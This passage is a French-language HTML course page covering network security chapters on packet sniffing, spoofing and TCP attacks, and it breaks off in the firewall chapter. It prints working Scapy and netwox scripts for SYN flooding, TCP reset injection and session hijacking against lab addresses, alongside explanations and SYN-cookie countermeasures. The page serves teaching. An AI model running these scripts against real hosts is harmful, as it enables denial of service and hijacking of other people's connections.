@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SecNet — Cours Sécurité Réseaux en Français</title>
+<meta name="description" content="Cours de sécurité réseaux traduits en français - Chapitres 15-20 Wenliang Du">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0f172a; --bg2: #1e293b; --bg3: #334155;
+  --text: #e2e8f0; --text2: #94a3b8; --border: #334155;
+  --acc: #6366f1; --green: #10b981; --red: #ef4444;
+  --orange: #f59e0b; --cyan: #06b6d4;
+}
+body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; }
+a { color: var(--acc); text-decoration: none; }
+
+/* Nav */
+#sidebar {
+  position: fixed; top: 0; left: 0; width: 260px; height: 100vh;
+  background: var(--bg2); border-right: 1px solid var(--border);
+  overflow-y: auto; z-index: 100; transition: transform .3s;
+  display: flex; flex-direction: column;
+}
+#sidebar.hidden { transform: translateX(-260px); }
+.sidebar-logo { padding: 1.2rem 1rem; font-weight: 800; font-size: 1rem;
+  background: linear-gradient(135deg,#6366f1,#06b6d4);
+  -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
+.sidebar-logo span { display: block; font-size: .7rem; color: #64748b; -webkit-text-fill-color: #64748b; margin-top: .1rem; }
+.ch-link { display: flex; align-items: center; gap: .6rem; padding: .6rem 1rem;
+  color: var(--text2); font-size: .82rem; font-weight: 500; border-left: 3px solid transparent;
+  cursor: pointer; transition: all .2s; }
+.ch-link:hover { background: rgba(99,102,241,.1); color: var(--text); }
+.ch-link.active { border-left-color: var(--acc); color: var(--text); background: rgba(99,102,241,.12); }
+.ch-link .badge { font-size: .65rem; padding: .1rem .4rem; border-radius: 4px; color: #fff; margin-left: auto; }
+.sec-link { padding: .35rem 1rem .35rem 2.5rem; color: #64748b; font-size: .75rem; cursor: pointer; display: block; transition: all .2s; }
+.sec-link:hover { color: var(--text2); }
+.sec-links { display: none; }
+.sec-links.open { display: block; }
+
+/* Main */
+#main { margin-left: 260px; min-height: 100vh; padding: 2rem; transition: margin .3s; }
+#main.full { margin-left: 0; }
+.toggle-btn {
+  position: fixed; top: 1rem; left: 1rem; z-index: 200;
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; padding: .4rem .7rem; cursor: pointer; font-size: 1rem;
+  color: var(--text); transition: all .2s; display: none;
+}
+.toggle-btn:hover { background: var(--acc); color: #fff; }
+
+/* Chapter page */
+.ch-page { display: none; animation: fadeIn .3s; }
+.ch-page.active { display: block; }
+.ch-hero { padding: 2rem; border-radius: 16px; margin-bottom: 2rem;
+  background: linear-gradient(135deg, rgba(99,102,241,.15), rgba(6,182,212,.1));
+  border: 1px solid var(--border); }
+.ch-hero h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: .3rem; }
+.ch-hero .sub { color: var(--text2); font-size:.9rem; }
+.ch-hero .num { font-size: 3rem; opacity: .3; float: right; font-weight: 900; }
+
+/* Sections */
+.section-card { background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 12px; margin-bottom: 1.2rem; overflow: hidden; }
+.section-card h3 { padding: .9rem 1.2rem; cursor: pointer; font-size: .95rem;
+  display: flex; align-items: center; justify-content: space-between;
+  background: var(--bg3); transition: background .2s; }
+.section-card h3:hover { background: rgba(99,102,241,.15); }
+.section-body { padding: 1.2rem; display: none; }
+.section-body.open { display: block; animation: fadeIn .2s; }
+.section-body p { margin-bottom: .8rem; }
+.section-body h4 { color: var(--cyan); margin: 1rem 0 .5rem; font-size: .9rem; }
+.section-body ul, .section-body ol { padding-left: 1.5rem; margin-bottom: .8rem; }
+.section-body li { margin: .3rem 0; }
+pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+  padding: .9rem 1rem; overflow-x: auto; font-size: .78rem; line-height: 1.6;
+  color: #e6edf3; margin: .8rem 0; font-family: 'Fira Code', monospace; }
+code { background: rgba(99,102,241,.15); padding: .1em .35em; border-radius: 4px;
+  font-size: .85em; color: #a5b4fc; font-family: 'Fira Code', monospace; }
+pre code { background: none; padding: 0; color: inherit; }
+table { width: 100%; border-collapse: collapse; margin: .8rem 0; font-size: .83rem; }
+th { background: var(--bg3); padding: .5rem .8rem; text-align: left; font-weight: 600; }
+td { padding: .45rem .8rem; border-top: 1px solid var(--border); }
+
+/* Callouts */
+.tip { background: rgba(16,185,129,.1); border-left: 3px solid #10b981; padding: .7rem 1rem; border-radius: 0 8px 8px 0; margin: .8rem 0; font-size: .85rem; }
+.warn { background: rgba(245,158,11,.1); border-left: 3px solid #f59e0b; padding: .7rem 1rem; border-radius: 0 8px 8px 0; margin: .8rem 0; font-size: .85rem; }
+.danger { background: rgba(239,68,68,.1); border-left: 3px solid #ef4444; padding: .7rem 1rem; border-radius: 0 8px 8px 0; margin: .8rem 0; font-size: .85rem; }
+
+/* Diagrams */
+.diagram { background: rgba(99,102,241,.05); border: 1px solid var(--border);
+  border-radius: 10px; padding: 1rem; margin: .8rem 0; text-align: center; }
+.diag-box { background: var(--bg3); border-radius: 8px; padding: .6rem 1rem;
+  display: inline-block; margin: .3rem auto; font-size: .82rem; min-width: 150px; }
+.diag-arrow { color: var(--acc); font-size: 1.2rem; margin: .1rem 0; }
+
+/* Welcome */
+#welcome { }
+.chapters-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 1rem; margin-top: 1.5rem; }
+.ch-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px;
+  padding: 1.2rem; cursor: pointer; transition: all .25s; position: relative; overflow: hidden; }
+.ch-card:hover { transform: translateY(-3px); box-shadow: 0 8px 24px rgba(0,0,0,.3); }
+.ch-card .ch-num { font-size: 2.5rem; opacity: .2; position: absolute; right: 1rem; top: .5rem; font-weight: 900; }
+.ch-card h3 { font-size: .95rem; font-weight: 700; margin-bottom: .3rem; }
+.ch-card p { font-size: .8rem; color: var(--text2); }
+.ch-card .dot { width: 4px; height: 100%; position: absolute; left: 0; top: 0; border-radius: 12px 0 0 12px; }
+.hero-main { text-align: center; padding: 3rem 1rem 2rem; }
+.hero-main h1 { font-size: 2.2rem; font-weight: 900; background: linear-gradient(135deg,#6366f1,#06b6d4);
+  -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: .5rem; }
+.hero-main p { color: var(--text2); font-size: .95rem; }
+.stats-row { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin: 1.5rem 0; }
+.stat { text-align: center; background: var(--bg2); padding: .8rem 1.5rem; border-radius: 10px; border: 1px solid var(--border); }
+.stat dt { font-size: 1.5rem; font-weight: 800; color: var(--acc); }
+.stat dd { font-size: .72rem; color: var(--text2); text-transform: uppercase; }
+@keyframes fadeIn { from { opacity:0; transform:translateY(-5px); } to { opacity:1; transform:translateY(0); } }
+@media(max-width:768px) {
+  #sidebar { transform: translateX(-260px); }
+  #sidebar.visible { transform: translateX(0); }
+  #main { margin-left: 0 !important; padding: 1rem; }
+  .toggle-btn { display: block; }
+  .ch-hero h1 { font-size: 1.3rem; }
+  table { font-size: .73rem; display: block; overflow-x: auto; }
+  pre { font-size: .7rem; }
+  .chapters-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<button class="toggle-btn" onclick="toggleSidebar()">☰</button>
+<nav id="sidebar">
+  <div class="sidebar-logo">📚 SecNet Cours<span>Sécurité Réseaux — FR</span></div>
+  <div class="ch-link" onclick="showHome()">🏠 <span>Accueil</span></div>
+  
+<div class="ch-link" data-ch="ch15" onclick="showChapter('ch15')"
+     style="border-left-color:#6366f100">
+  <span>👁</span>
+  <span>Chapitre 15</span>
+  <span class="badge" style="background:#6366f1">15</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch15');scrollToSection('s151')">15.1 Comment les paquets sont reçus</span>
+<span class="sec-link" onclick="showChapter('ch15');scrollToSection('s152')">15.2 Packet Sniffing</span>
+<span class="sec-link" onclick="showChapter('ch15');scrollToSection('s153')">15.3 Packet Spoofing</span>
+<span class="sec-link" onclick="showChapter('ch15');scrollToSection('s157')">15.7 Endianness (Ordre des octets)</span>
+</div>
+<div class="ch-link" data-ch="ch16" onclick="showChapter('ch16')"
+     style="border-left-color:#ef444400">
+  <span>🔒</span>
+  <span>Chapitre 16</span>
+  <span class="badge" style="background:#ef4444">16</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch16');scrollToSection('s161')">16.1 Fonctionnement du protocole TCP</span>
+<span class="sec-link" onclick="showChapter('ch16');scrollToSection('s162')">16.2 Attaque SYN Flooding</span>
+<span class="sec-link" onclick="showChapter('ch16');scrollToSection('s163')">16.3 Attaque TCP Reset</span>
+<span class="sec-link" onclick="showChapter('ch16');scrollToSection('s164')">16.4 Session Hijacking (Détournement de sessi</span>
+</div>
+<div class="ch-link" data-ch="ch17" onclick="showChapter('ch17')"
+     style="border-left-color:#f59e0b00">
+  <span>🛡</span>
+  <span>Chapitre 17</span>
+  <span class="badge" style="background:#f59e0b">17</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch17');scrollToSection('s171')">17.1 & 17.2 Introduction et Types</span>
+<span class="sec-link" onclick="showChapter('ch17');scrollToSection('s174')">17.4 iptables — Pare-feu Linux</span>
+<span class="sec-link" onclick="showChapter('ch17');scrollToSection('s175')">17.5 Contournement de Pare-feu</span>
+</div>
+<div class="ch-link" data-ch="ch18" onclick="showChapter('ch18')"
+     style="border-left-color:#06b6d400">
+  <span>🌐</span>
+  <span>Chapitre 18</span>
+  <span class="badge" style="background:#06b6d4">18</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch18');scrollToSection('s181')">18.1 Fonctionnement du DNS</span>
+<span class="sec-link" onclick="showChapter('ch18');scrollToSection('s182')">18.2 Attaque DNS Cache Poisoning</span>
+<span class="sec-link" onclick="showChapter('ch18');scrollToSection('s183')">18.3 DNS Rebinding</span>
+</div>
+<div class="ch-link" data-ch="ch19" onclick="showChapter('ch19')"
+     style="border-left-color:#10b98100">
+  <span>🔐</span>
+  <span>Chapitre 19</span>
+  <span class="badge" style="background:#10b981">19</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch19');scrollToSection('s191')">19.1 Introduction au VPN</span>
+<span class="sec-link" onclick="showChapter('ch19');scrollToSection('s192')">19.2 TUN/TAP — Interface VPN Linux</span>
+<span class="sec-link" onclick="showChapter('ch19');scrollToSection('s193')">19.3 OpenVPN et SSH Tunneling</span>
+</div>
+<div class="ch-link" data-ch="ch20" onclick="showChapter('ch20')"
+     style="border-left-color:#ec489900">
+  <span>💔</span>
+  <span>Chapitre 20</span>
+  <span class="badge" style="background:#ec4899">20</span>
+</div>
+<div class="sec-links"><span class="sec-link" onclick="showChapter('ch20');scrollToSection('s201')">20.1 Description du Bug</span>
+<span class="sec-link" onclick="showChapter('ch20');scrollToSection('s202')">20.2 Code vulnérable et Exploitation</span>
+</div>
+</nav>
+<main id="mainEl" id="main" style="margin-left:260px;padding:2rem;min-height:100vh;transition:margin .3s">
+  
+<div id="welcome">
+  <div class="hero-main">
+    <h1>📚 SecNet — Cours en Français</h1>
+    <p>Sécurité Réseaux · Wenliang Du · Chapitres 15-20 traduits</p>
+    <div class="stats-row">
+      <dl class="stat"><dt>6</dt><dd>Chapitres</dd></dl>
+      <dl class="stat"><dt>19</dt><dd>Sections</dd></dl>
+      <dl class="stat"><dt>FR</dt><dd>Langue</dd></dl>
+      <dl class="stat"><dt>100%</dt><dd>Gratuit</dd></dl>
+    </div>
+  </div>
+  <div class="chapters-grid">
+<div class="ch-card" onclick="showChapter('ch15')" style="border-color:#6366f133">
+  <div class="dot" style="background:#6366f1"></div>
+  <span class="ch-num">15</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">👁</div>
+  <h3>Capture & Falsification de Paquets</h3>
+  <p>Chapitre 15 · 4 sections</p>
+</div>
+<div class="ch-card" onclick="showChapter('ch16')" style="border-color:#ef444433">
+  <div class="dot" style="background:#ef4444"></div>
+  <span class="ch-num">16</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">🔒</div>
+  <h3>Attaques sur le Protocole TCP</h3>
+  <p>Chapitre 16 · 4 sections</p>
+</div>
+<div class="ch-card" onclick="showChapter('ch17')" style="border-color:#f59e0b33">
+  <div class="dot" style="background:#f59e0b"></div>
+  <span class="ch-num">17</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">🛡</div>
+  <h3>Pare-feu (Firewall)</h3>
+  <p>Chapitre 17 · 3 sections</p>
+</div>
+<div class="ch-card" onclick="showChapter('ch18')" style="border-color:#06b6d433">
+  <div class="dot" style="background:#06b6d4"></div>
+  <span class="ch-num">18</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">🌐</div>
+  <h3>DNS et Attaques DNS</h3>
+  <p>Chapitre 18 · 3 sections</p>
+</div>
+<div class="ch-card" onclick="showChapter('ch19')" style="border-color:#10b98133">
+  <div class="dot" style="background:#10b981"></div>
+  <span class="ch-num">19</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">🔐</div>
+  <h3>VPN — Réseau Privé Virtuel</h3>
+  <p>Chapitre 19 · 3 sections</p>
+</div>
+<div class="ch-card" onclick="showChapter('ch20')" style="border-color:#ec489933">
+  <div class="dot" style="background:#ec4899"></div>
+  <span class="ch-num">20</span>
+  <div style="font-size:1.5rem;margin-bottom:.4rem">💔</div>
+  <h3>Le Bug Heartbleed</h3>
+  <p>Chapitre 20 · 2 sections</p>
+</div></div>
+</div>
+  
+<div class="ch-page" id="ch15">
+  <div class="ch-hero" style="border-color:#6366f144">
+    <span class="num">15</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">👁</div>
+    <h1 style="color:#6366f1">Capture & Falsification de Paquets</h1>
+    <div class="sub">Chapitre 15 — Packet Sniffing & Spoofing</div>
+  </div>
+  
+<div class="section-card" id="s151">
+  <h3 onclick="toggleSection(this)">15.1 Comment les paquets sont reçus<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Les machines sont connectées aux réseaux via des <strong>Cartes d'Interface Réseau (NIC)</strong>. Chaque NIC possède une adresse matérielle appelée <strong>adresse MAC</strong>. Les réseaux locaux (Ethernet, WiFi) sont des médias broadcast : toutes les NIC entendent toutes les trames.</p>
+<p>Quand une trame arrive, la NIC vérifie l'adresse MAC destination :</p>
+<ul>
+  <li>Si l'adresse correspond → la trame est copiée dans le buffer noyau (Ring Buffer) via <strong>DMA</strong></li>
+  <li>La CPU est interrompue pour traiter le paquet</li>
+  <li>Le paquet est dispatché aux applications via le stack réseau</li>
+</ul>
+<h4>Mode Promiscuous</h4>
+<p>En mode normal, la NIC rejette les trames non destinées à elle. En <strong>mode promiscueux</strong>, la NIC transmet TOUS les paquets au noyau, peu importe l'adresse MAC destination. Cela permet le sniffing. Nécessite les droits <strong>root</strong>.</p>
+<div class="diagram">
+  <div class="diag-box" style="background:#1e1b4b">Application (User Space)</div>
+  <div class="diag-arrow">↑ Protocoles réseau</div>
+  <div class="diag-box" style="background:#312e81">Ring Buffer (Kernel)</div>
+  <div class="diag-arrow">↑ DMA</div>
+  <div class="diag-box" style="background:#4c1d95">NIC — Carte Réseau</div>
+  <div class="diag-arrow">↑</div>
+  <div class="diag-box" style="background:#1e3a5f">Réseau (câble/WiFi)</div>
+</div>
+<h4>BSD Packet Filter (BPF)</h4>
+<p>Le <strong>BPF</strong> permet de filtrer les paquets au niveau le plus bas (noyau) avant de les livrer à l'application. Cela évite de traiter tous les paquets inutilement. Les filtres sont écrits en expressions booléennes lisibles (ex: <code>ip proto icmp</code>, <code>dst host 10.0.2.5</code>).</p>
+</div>
+</div>
+<div class="section-card" id="s152">
+  <h3 onclick="toggleSection(this)">15.2 Packet Sniffing<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le <strong>sniffing</strong> consiste à capturer les paquets en transit sur un réseau. Il est utilisé par les administrateurs pour diagnostiquer, et par les attaquants pour la reconnaissance.</p>
+<h4>Sockets bruts (Raw Sockets)</h4>
+<p>Un socket normal ne reçoit que les paquets qui lui sont destinés. Un <strong>raw socket</strong> reçoit une copie de TOUS les paquets. On crée un raw socket avec :</p>
+<pre>int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+// Activer le mode promiscueux
+mr.mr_type = PACKET_MR_PROMISC;
+setsockopt(sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr));</pre>
+<h4>API pcap (libpcap)</h4>
+<p>La bibliothèque <strong>libpcap</strong> offre une interface portable et optimisée pour la capture :</p>
+<pre>// 1. Ouvrir la session de capture
+pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
+// 2. Compiler et appliquer un filtre
+pcap_compile(handle, &fp, "ip proto icmp", 0, net);
+pcap_setfilter(handle, &fp);
+// 3. Boucle de capture
+pcap_loop(handle, -1, got_packet, NULL);</pre>
+<h4>Analyser un paquet capturé</h4>
+<p>On utilise le <strong>type casting</strong> pour accéder aux champs des headers :</p>
+<pre>struct ethheader *eth = (struct ethheader *) packet;
+if (ntohs(eth->ether_type) == 0x0800) { // Paquet IP
+    struct ipheader *ip = (struct ipheader *)
+                          (packet + sizeof(struct ethheader));
+    printf("Source: %s
+", inet_ntoa(ip->iph_sourceip));
+    printf("Dest:   %s
+", inet_ntoa(ip->iph_destip));
+}</pre>
+<div class="tip">💡 Exemples de filtres pcap : <code>dst host 10.0.2.5</code>, <code>src host 10.0.2.6</code>, <code>proto tcp</code>, <code>host 10.0.2.6 and src port 9090</code></div>
+</div>
+</div>
+<div class="section-card" id="s153">
+  <h3 onclick="toggleSection(this)">15.3 Packet Spoofing<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le <strong>spoofing</strong> consiste à envoyer des paquets avec des informations falsifiées (IP source, port, flags TCP…). C'est la base de nombreuses attaques : SYN Flood, DNS Poisoning, Session Hijacking.</p>
+<h4>Envoi avec Raw Socket</h4>
+<p>Avec un raw socket, on construit entièrement le paquet (header IP + header protocole + données) :</p>
+<pre>// Créer le socket brut
+int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+int enable = 1;
+setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
+
+// Construire le header IP
+ip->iph_ver = 4;
+ip->iph_ttl = 20;
+ip->iph_sourceip.s_addr = inet_addr("1.2.3.4"); // IP falsifiée
+ip->iph_destip.s_addr   = inet_addr("10.0.2.69");
+ip->iph_protocol = IPPROTO_ICMP;
+
+// Envoyer
+sendto(sock, ip, ntohs(ip->iph_len), 0,
+       (struct sockaddr*)&dest_info, sizeof(dest_info));</pre>
+<div class="warn">⚠️ Seul root (ou CAP_NET_RAW) peut créer des raw sockets !</div>
+<h4>Spoofing avec Scapy (Python)</h4>
+<pre>from scapy.all import *
+# Spoofed ICMP
+pkt = IP(src="1.2.3.4", dst="10.0.2.69") / ICMP()
+send(pkt)
+# Spoofed UDP
+pkt = IP(src="1.2.3.4", dst="10.0.2.69") / UDP(dport=9090) / "Hello"
+send(pkt)</pre>
+</div>
+</div>
+<div class="section-card" id="s157">
+  <h3 onclick="toggleSection(this)">15.7 Endianness (Ordre des octets)<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Les processeurs x86 utilisent le format <strong>Little-Endian</strong> (octet de faible poids en premier). Le réseau utilise le format <strong>Big-Endian</strong> (Network Byte Order, octet de fort poids en premier). Il faut donc convertir !</p>
+<div class="diagram">
+  <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap">
+    <div class="diag-box" style="background:#1e3a5f;flex:1;min-width:200px">
+      <strong>Little-Endian (x86)</strong><br>
+      Valeur 256 (0x0100)<br>
+      Mémoire: <code>[00][01]</code>
+    </div>
+    <div class="diag-box" style="background:#1e3a5f;flex:1;min-width:200px">
+      <strong>Big-Endian (Réseau)</strong><br>
+      Valeur 256 (0x0100)<br>
+      Mémoire: <code>[01][00]</code>
+    </div>
+  </div>
+</div>
+<h4>Fonctions de conversion</h4>
+<table><thead><tr><th>Fonction</th><th>Rôle</th></tr></thead><tbody>
+<tr><td><code>htons(x)</code></td><td>Host→Network short (16 bits)</td></tr>
+<tr><td><code>htonl(x)</code></td><td>Host→Network long (32 bits)</td></tr>
+<tr><td><code>ntohs(x)</code></td><td>Network→Host short</td></tr>
+<tr><td><code>ntohl(x)</code></td><td>Network→Host long</td></tr>
+</tbody></table>
+<div class="danger">🚨 Bug classique : sans conversion, 255 octets peut être interprété comme ~4 Go → crash/DoS !</div>
+</div>
+</div>
+</div>
+<div class="ch-page" id="ch16">
+  <div class="ch-hero" style="border-color:#ef444444">
+    <span class="num">16</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">🔒</div>
+    <h1 style="color:#ef4444">Attaques sur le Protocole TCP</h1>
+    <div class="sub">Chapitre 16 — TCP Attacks</div>
+  </div>
+  
+<div class="section-card" id="s161">
+  <h3 onclick="toggleSection(this)">16.1 Fonctionnement du protocole TCP<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>TCP (Transmission Control Protocol) est un protocole de transport <strong>fiable et ordonné</strong>. Il établit une connexion logique entre deux machines avant d'échanger des données.</p>
+<h4>TCP Header — Format</h4>
+<div class="diagram">
+  <table style="width:100%;font-size:.8rem;text-align:center">
+    <tr style="background:#312e81"><td colspan="2"><strong>Port Source (16 bits)</strong></td><td colspan="2"><strong>Port Destination (16 bits)</strong></td></tr>
+    <tr style="background:#1e3a5f"><td colspan="4"><strong>Numéro de Séquence (32 bits)</strong></td></tr>
+    <tr style="background:#1e3a5f"><td colspan="4"><strong>Numéro d'Acquittement (32 bits)</strong></td></tr>
+    <tr style="background:#312e81"><td>Offset (4)</td><td>Réservé</td><td><strong>Flags: SYN FIN ACK RST PSH URG</strong></td><td>Fenêtre (16)</td></tr>
+    <tr style="background:#1e3a5f"><td colspan="2"><strong>Checksum (16)</strong></td><td colspan="2"><strong>Pointeur Urgent (16)</strong></td></tr>
+  </table>
+</div>
+<ul>
+  <li><strong>Numéro de séquence</strong> : identifie le premier octet du segment</li>
+  <li><strong>Numéro d'acquittement</strong> : prochain octet attendu</li>
+  <li><strong>Flags SYN/FIN/RST</strong> : contrôle de connexion</li>
+  <li><strong>Fenêtre</strong> : contrôle de flux</li>
+</ul>
+<h4>Three-Way Handshake</h4>
+<div class="diagram">
+  <div style="display:flex;gap:2rem;justify-content:center;align-items:flex-start;flex-wrap:wrap">
+    <div style="text-align:center;flex:1">
+      <div class="diag-box" style="background:#1e3a5f">Client</div>
+      <div style="margin:.5rem 0">──── SYN (seq=x) ────→</div>
+      <div style="margin:.5rem 0">←── SYN+ACK (seq=y, ack=x+1) ──</div>
+      <div style="margin:.5rem 0">──── ACK (ack=y+1) ────→</div>
+      <div class="diag-box" style="background:#14532d;margin-top:.5rem">Connexion établie ✅</div>
+    </div>
+    <div style="text-align:center;flex:1">
+      <div class="diag-box" style="background:#1e3a5f">Serveur</div>
+      <div style="margin:.5rem 0">← reçoit SYN → stocke TCB</div>
+      <div style="margin:.5rem 0">← attend ACK...</div>
+      <div class="diag-box" style="background:#14532d;margin-top:2.5rem">Connexion établie ✅</div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+<div class="section-card" id="s162">
+  <h3 onclick="toggleSection(this)">16.2 Attaque SYN Flooding<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Le <strong>SYN Flooding</strong> est une attaque DoS qui exploite la file d'attente des connexions semi-ouvertes du serveur.</p>
+<h4>Principe</h4>
+<div class="diagram">
+  <div style="text-align:center">
+    <div class="diag-box" style="background:#7f1d1d">Attaquant</div>
+    <div>──── SYN (IP source aléatoire) ────→ ×1000</div>
+    <div class="diag-box" style="background:#1e3a5f;margin:.5rem auto">Serveur<br><small>File TCB : [⬜⬜⬜⬜⬜⬜⬜⬜] PLEINE</small></div>
+    <div style="color:#ef4444">❌ Plus de place → Nouveaux clients rejetés</div>
+  </div>
+</div>
+<h4>Mécanisme détaillé</h4>
+<ol>
+  <li>L'attaquant envoie des milliers de SYN avec des <strong>IP sources spoofées</strong></li>
+  <li>Le serveur répond SYN+ACK et stocke un TCB dans sa file</li>
+  <li>Le 3ème ACK n'arrive jamais → entrées restent jusqu'au timeout (~40s)</li>
+  <li>La file est pleine → le serveur rejette tous les nouveaux SYN</li>
+</ol>
+<pre># Attaque avec netwox
+sudo netwox 76 -i 10.0.2.69 -p 23 -s raw
+
+# Ou avec Scapy
+from scapy.all import *
+while True:
+    src_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
+    pkt = IP(src=src_ip, dst="10.0.2.69") / TCP(dport=23, flags="S")
+    send(pkt, verbose=0)</pre>
+<h4>Contre-mesure : SYN Cookies</h4>
+<p>Le serveur encode l'état de la connexion dans le <strong>numéro de séquence</strong> du SYN+ACK. Aucune mémoire allouée avant la réception du 3ème ACK.</p>
+<pre># Activer SYN Cookies (Linux)
+sysctl -w net.ipv4.tcp_syncookies=1</pre>
+<div class="tip">✅ Avec SYN cookies : l'attaquant peut flooder, mais aucune ressource n'est consommée côté serveur !</div>
+</div>
+</div>
+<div class="section-card" id="s163">
+  <h3 onclick="toggleSection(this)">16.3 Attaque TCP Reset<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Un seul paquet RST peut <strong>couper une connexion TCP existante</strong> entre deux victimes.</p>
+<h4>Comment TCP ferme une connexion</h4>
+<ul>
+  <li><strong>Méthode douce (FIN)</strong> : A envoie FIN → B répond ACK → B envoie FIN → A répond ACK</li>
+  <li><strong>Méthode brutale (RST)</strong> : Un seul paquet RST coupe immédiatement la connexion</li>
+</ul>
+<h4>L'attaque</h4>
+<p>L'attaquant spoofe un paquet RST de A vers B (ou de B vers A). Pour réussir, il doit deviner :</p>
+<ul>
+  <li>IP source et destination (par sniffing)</li>
+  <li>Port source et destination (par sniffing)</li>
+  <li><strong>Numéro de séquence</strong> dans la fenêtre de réception (critique !)</li>
+</ul>
+<pre>from scapy.all import *
+# Sniffer pour trouver seq number
+def spoof_rst(pkt):
+    if TCP in pkt:
+        rst = IP(src=pkt[IP].src, dst=pkt[IP].dst) /               TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
+                  seq=pkt[TCP].seq, flags="R")
+        send(rst, verbose=0)
+
+sniff(filter="tcp", prn=spoof_rst)</pre>
+<div class="warn">⚠️ Le bit RST est employé par le <em>Great Firewall of China</em> pour censurer les connexions !</div>
+</div>
+</div>
+<div class="section-card" id="s164">
+  <h3 onclick="toggleSection(this)">16.4 Session Hijacking (Détournement de session)<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>L'attaquant injecte des données malveillantes dans une connexion TCP existante entre A et B.</p>
+<h4>Étapes</h4>
+<ol>
+  <li><strong>Sniffing</strong> : intercepter les paquets pour obtenir seq/ack, ports, IPs</li>
+  <li><strong>Spoofing</strong> : envoyer un paquet spoofé avec le bon numéro de séquence</li>
+  <li>La victime exécute la commande injectée</li>
+</ol>
+<pre>from scapy.all import *
+
+def hijack(pkt):
+    if pkt[TCP].payload:
+        newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) /                  TCP(sport=pkt[TCP].sport,
+                     dport=pkt[TCP].dport,
+                     seq=pkt[TCP].seq,
+                     ack=pkt[TCP].ack,
+                     flags="PA") /                  "commande malveillante
+"
+        send(newpkt)
+
+sniff(filter="tcp and src host 10.0.2.68", prn=hijack)</pre>
+<div class="danger">🚨 Conséquence : désynchronisation des numéros seq/ack → la connexion légitime est cassée !</div>
+</div>
+</div>
+</div>
+<div class="ch-page" id="ch17">
+  <div class="ch-hero" style="border-color:#f59e0b44">
+    <span class="num">17</span>
+    <div style="font-size:2rem;margin-bottom:.5rem">🛡</div>
+    <h1 style="color:#f59e0b">Pare-feu (Firewall)</h1>
+    <div class="sub">Chapitre 17 — Firewall</div>
+  </div>
+  
+<div class="section-card" id="s171">
+  <h3 onclick="toggleSection(this)">17.1 & 17.2 Introduction et Types<span class="arrow">▼</span></h3>
+  <div class="section-body open">
+<p>Un <strong>pare-feu</strong> est un système de sécurité qui filtre le trafic réseau entre zones de confiance différentes. Il applique une <strong>politique de sécurité</strong> en autorisant ou bloquant les paquets.</p>
+<div class="diagram">
+  <div style="display:flex;gap:1rem;align-items:center;justify-content:center;flex-wrap:wrap">
+    <div class="diag-box" style="background:#1e3a5f">Internet (Non fiable)</div>
+    <div style="font-size:1.5rem">→</div>
+    <div class="diag-box" style="background:#7c2d12">🛡 FIREWALL</div>
+    <div style="font-size:1.5rem">→</div>
+    <div class="diag-box" style="background:#14532d">Réseau Local (Fiable)</div>
+  </div>
+</div>
+<h4>Types de pare-feu</h4>
+<table><thead><tr><th>Type</th><th>Fonctionnement</th><th>Niveau</th></tr></thead><tbody>
+<tr><td><strong>Packet Filter</strong></td><td>Filtre par IP/port/protocole</td><td>Réseau (L3/L4)</td></tr>
+<tr><td><strong>Stateful</strong></td><td>Suit l'état des connexions</td><td>Transport (L4)</td></tr>
+<tr><td><strong>Application/Proxy</strong></td><td>Analyse le contenu applicatif</td><td>Application (L7)</td></tr>
+</tbody></table>
+<ul>
+  <li><strong>Filtrage Ingress</strong> : filtre le trafic entrant</li>
+  <li><strong>Filtrage Egress</strong> : filtre le trafic sortant</li>
